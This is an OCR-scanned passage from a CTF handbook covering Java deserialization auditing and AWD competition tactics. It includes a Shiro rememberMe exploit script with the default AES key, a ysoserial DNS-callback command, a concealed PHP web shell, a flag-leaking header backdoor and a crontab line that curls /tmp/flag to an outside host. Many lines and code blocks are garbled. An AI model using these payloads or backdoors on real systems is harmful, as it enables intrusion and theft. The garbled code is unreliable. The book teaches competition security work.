Fig. 10.57.
(6) Attack limits
Oracle has set com.sun.jndi.rmi.object.trustURLCodebase=false since jdk8u121 to
restrict the RMI exploit from loading Class
8com.sun.jndi.rmi.registry.
RegistryContext#decodeObject from a remote location.
Oracle sets com.sun.jndi.ldap.object.trustURLCodebase=false since jdk8u191 to
restrict using LDAP to load Classes from remote locations.
For versions after jdk8u191, JDNI injection is very difficult to exploit. But there
o uo ps s ue o u  sq o o m sem s ane
8, it can be bypassed by the javax.el package. However Tomcat 7 does not have a
---
## Page 732
720
10 Code Auditing
Aed1so
[*127,e.e.1:7ee1*, get_poc(*poc_fite2.txt*)
ir
runt)
'_nain_':
hr1p8//127.0.0.1:70
EE
U
Fig, 10.57 Result
javax.el package by default. I won't go into details here due to space limitations, but
for more detailed information, you can refer to the following documents.
https://www.veracode.com/blog/research/exploiting-jndi-injections-java
10.2.8.2  Deserialization Exploit Tool ysoserial/marshalsec
ysoserial/marshalsec are both deserialization Gadget assemblies. When a
deserialization vulnerability is found, a string of serialization data needs to be passed
to the deserialization function calls to make it complete the deserialization and
no sy (uonaxo pe ao ensn) iodx am uoado o od
have found a controllable deserialization point now, you still need a payload that
can perform command execution. It's time to use ysoserial and marshalsec to
generate the payload (see Github for details).
To build a vulnerable environment quickly, you candownload the code from
Github and deploy it to Tomcat as follows.
git clone https : //github, com/apache/shiro.git
git checkout shiro-zoot -1.2.4
/shiro/samples/veb /shiro/samples/web
Next, to get shiro up and running, you need to modify the pom.xml file by adding
the following code.
---
## Page 733
10.2 Java Code Auditing
721
Apache Shiro Quickstart
set( Leg.st)
eme to the Agsche Shiro Qric
Roles
olts you hurve
erd
Fig, 10.58 The shiro demo is up and running
javax,sezvlet
jstl-
1. 2
runtime
s  o n   A  se no   
web-1.2.4.war generated in the target directory to the webapps directory in the
Tomcat, and rename the war package to shiro.war. Start up Tomcat and
browse http://localhost:8080/shiro you can see that the shiro demo is up and running
as shown in Fig. 10.58.
A good way to initially detect vulnerabilities is to use the ysoserial URLDNS
Gadget in conjunction with dnslog (here using ceye).
First, generate the URL DNS payload using ysoserial.
java -jar ysosezial-master-ff59523eb6-1 . jar URLDNs http: //shiro.
rzjval.ceye.io' > poc
AES encryption is then applied to Payload using Shiro's built-in default key,
which is as follows.
import os
import re
import base64
import subprocess
import uuid
from Crypto .Cipher inport AES
import requests
JAR_FILE = Location of local ysoserial too1'
---
## Page 734
722
10  Code Auditing
def poc (url, rce_command) :
if '://' not inurl:
target = *https://vs* $ ur1 if +:443 in url else 'http://vs' $ ux1
else :
target = ur1
try :
payload = generatox (rce_command, JAR_FILE)
print payload decode ()
 = requests .get (target, cookies={ ' renenberMe* : payload. decode
(), timeout=10)
except Exception, e:
print r.text
return False
pass
def generator (command, fp) :
if not os -path.exists (fp) :
raise Exception (*jaz file not found:*)
Popen = subprocess .Popen(['java', '-jar', fp, URLDNs', command] 
BS = AEs.block_size
stdout=subprocess. PIPE)
pad = Lambda a:  + ( (BS - Len (e)  Bs) * chx (Bs - len (α)  BS)) encode () 1
key = *kPH+bIxk5D2deZiIxcaaaA==*
iv = uuid.uuid4 () .bytes
mode = AES .MODE_CBC 
encryptor = AES.new (base64 .b64decode (key) , mode, iv)
base64_ciphertext = base64 .b64encode [iv + encryptor. encrypt
file_body = pad (popen.stdout .read() )
(file_body) )
return base64_ciphertext
poc ('http://localhost :8o8o/shiro', 'address of dns server1)
Run exploit and you will see the request record in the DNS resolution record, see
Figs. 10.59 and 10.60.
10.2.8.3 Summary of Java Web Vulnerability Exploits
This section summarizes the use of JDNI injection and ysoserial, which in the real
world are often combined into complete exploits through various Gadgets. The best
01 1nq rso oqs--o m 1 An o pou st Kqen ue nodxa o em
understand how it works and then build it. Only by *knowing what you know and
‘oed [eus e o asmo u nou no m ,um Sumoux
---
## Page 735
10.3Summary
723
TT B
口
IIHN
Fig, 10.59 Result
10.3
Summary
As time goes by, in addition to websites built in ASP, there are now also websites
built in PHP, Java, Go, Python and other languages. Due to space limitations, this
chapter only introduces the common PHP and Java code auditing.
Unlike code auditing in the real world, the purpose of code auditing challenges in
the CTF competition is mostly to find vulnerabilities such as IDOR, SQL injection
and even RCE. Only with familiarity with the language, can the participants find the
vulnerabilities in the complex code and solve the problem in a short time.
At the same time, having a good-looking IDE environment often makes all the
difference in the code audit process.
---
## Page 736
724
10  Code Audiing
rce,
andj:
FLal toel
else:
ta url els
get s ur7
pyltad-generater(rce_c
and, 3AR_FILE)
Eregests.get(trgt,cooktesen
tlon('Jar
AE5.block_stze
bk5020
v
Ad.d(3.b
etcrypt(ftte_body)
71
poctsttp://lacalhos
Fig, 10.60 Attack code (continued)
---
## Page 737
Chapter11
AWD
In this chapter, we will introduce the most common format of CTF finals, namely the
Altack With Defence (AWD). In AWD competitions there are usually multiple
challenges, each challenge corresponds to a gamebox (server), the gamebox of
each competition team has the same vulnerability environment, the players of each
team obtain the flags in the gamebox of other teams through the vulnerability to
score, and avoid being attacked by patching the vulnerability in their own gamebox.
The flags in the gameboxes will be updated within a specified time (a tick). Mean-
while, the organizer will check each team’s service in each round, and deduct points
for abnormal service.
Sungodxo pue Supuy u paods suedpogured a sauuexa uognaduos CMV au
vulnerabilities, their ability to analyze network traffic and patch vulnerabilities, and
their ability to automate the exploit process.
Since there are many AWD tricks, this chapter focuses on the Web challenges
only, and is divided into four parts: competition preparation, competition tricks,
traffic analysis, and vulnerability patching. In order not to affect the balance of the
competition, this chapter is mainly aimed at readers who have little or no experience
in A WD competitions to share some basic competition experience.
11.1Preparation for the Competition
The AWD competition is actually quite an examination of the speed of vulnerability
discovery and exploitation by the participants, so the time before the competition
officially starts is critical, and the following should be done. 
1. Detect IP range
dI o jo suded o uou sou Aeu suazuao sos suoduoo M u
range or the exit IP of each team, so you can use Nmap, Routescan or other port
C The Author(s), under exclusive license to Springer Nature Singapore Pte Ld. 2022
NulL Team, Handbook for CTFers,
725
htps:/doi.org/10.10077978-981-19-0336-6_11
---
## Page 738
726
11AWD
the competition to prepare for automation scripts.
scanning tools to scan the current Class C network a few minutes before the start of
2. Accumulation of exploits
Because the AWD competition web challenges tend to be close to reality, they are
usually well-formed CMS vulnerabilities or even CVE vulnerabilities. For example,
a web challenge can be a Drupal website, which has a RCE vulnerability,
CVE-2018-7600, besides a obvious weak password, and participants may not be
allowed to access the Intermet during some AWD competitions, so if you have an
exploit script that you normally prepare, you will get a head start.
3. The importance of backup
As soon as the game begins, all participants should back up the source code of their
web topics, but they often leave out another important backup, the database backup.
tbs*qp/du/ 
How to find such small files is critical. Here’s a command that will quickly find
the file with the smallest number of lines.
find - / -name 1* ,php ' | xargs vc -1 | sort -u
---
## Page 741
11.2  AWD Tricks
729
(2) Killing web shells
The author of web challenges is likely to put some web shells that are not obvious,
such as in a nested directory, which can be scanned globally with some automatic
tools. Of course, there are also some shells that are not obvious and need to be
discovered by the participant. For example, the following web shell is hard to be
detected by automatic tools and need to be discovered by the participant.
?php
Sstr="sesa";
8$aa (S_GET [111 ;
Saa=stz_shuffle (Sstr) . 1 rt ' ;
≤
(3) Remove persistent backdoors
A common persistent web shell is as follows.
flag
okkki
ubuntu:/tnp# cat /var/www/htnl/test.php
<eder(ftag:*fle_get_contents(/tnp/lag');
ot@ubuntu:/tnp# curl -w 127.8.0.1/test.php
was NOT found tn DNS cache
Host: 127.0.0.1
HTTP/1.1 200 OK
2019 13:37:38 GMT
Content-Type: text/htal
nectton #o to host 127.6.o.1 teft tntact
root@ubuntu:/tnpl
1. Through the header
For example, add the following line in a file that is always included, such as “config.
php".
Headez ('flag : ' .file_get_content.s (′/tmp/flag’) ) ;
Then visit any page of the service to receive the flag from the header, as shown in
Fig. 11.2
2. Submit via gamebox
Sometimes, gamebox has access to the API interface for submitting flags, so it is
possible to write a crontab backdoor to achieve covert submissions, for example.
*/5 + + + + cuz1 172.19 .1 . 2/flag/ -d 'flag=S (cat /tmp/flag) &token=Team
token'
3. Include files
A malicious PHP file may be easily discovered by an adversary, so it is beter to hide
the backdoor in a JavaScript file and include the JavaScript file. For example, if you
add an en.js file, the content of which is a backdoor, you can directly include the
JavaScript file in a PHP file to activate it.